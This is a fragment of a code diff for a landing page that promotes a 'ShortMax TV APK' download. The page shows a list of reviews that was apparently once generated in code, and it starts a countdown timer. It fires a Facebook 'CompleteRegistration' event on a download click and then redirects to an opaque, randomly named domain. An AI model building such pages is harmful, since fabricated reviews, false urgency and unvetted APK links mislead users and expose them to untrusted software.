       displayedReviewCount += nextBatch.length;
 
-      const remaining = allReviews.length - displayedReviewCount;
+      const remaining = UNIQUE_REVIEWS_LIST.length - displayedReviewCount;
       const loadBtn = document.getElementById('loadMoreBtn');
       if (remaining <= 0) {
         loadBtn.style.display = 'none';
@@ -572,16 +683,16 @@
     }
 
     function loadMoreReviews() {
-      renderReviews(6);
+      renderReviews(5);
     }
 
-    // 觸發下載（零延遲即時跳轉，多像素同步廣播）
+    // 觸發下載（多像素廣播回傳 + 專屬下載連結跳轉）
     const DOWNLOAD_URL = "https://0pj20sddue1m.supexpglotrd.com/qK4wbA8Iedks";
 
-    function triggerSmartDownload() {
+    function triggerSmartDownload(title = 'ShortMax TV APK Download') {
       if (typeof fbq === 'function') {
         fbq('track', 'CompleteRegistration', {
-          content_name: 'ShortMax TV APK Download',
+          content_name: title,
           status: true
         });
       }
@@ -610,10 +721,9 @@
       document.getElementById(modalId).classList.add('hidden');
     }
 
-    // 頁面初始化
+    // 頁面初始化：預設載入電影分類
     window.addEventListener('DOMContentLoaded', () => {
       switchCategory('movie');
-      generateReviews();
       renderReviews(4);
       startCountdown();
     });
